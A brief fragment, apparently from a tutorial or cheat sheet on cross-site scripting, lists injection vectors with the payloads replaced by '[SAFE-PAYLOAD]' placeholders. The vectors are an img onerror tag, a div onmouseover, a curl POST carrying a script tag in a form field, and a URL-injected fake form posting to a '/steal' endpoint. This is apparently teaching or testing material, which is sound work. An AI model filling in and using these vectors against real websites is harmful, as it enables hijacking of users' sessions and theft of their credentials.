...
<img src="x" onerror="[SAFE-PAYLOAD]">  <!-- XSS attempt -->
```
...
```html
<!-- URL injection -->
http://target.com/welcome?name=<h1>Welcome%20Admin</h1><form%20action="http://[SAFE-PAYLOAD]/steal">
...
curl -X POST -d "name=<script>[SAFE-PAYLOAD]</script>&email=test@test.com" \
...
<!-- Attribute-based -->
<div onmouseover="[SAFE-PAYLOAD]">Hover me</div>
<img src=x onerror=[SAFE-PAYLOAD]>
```
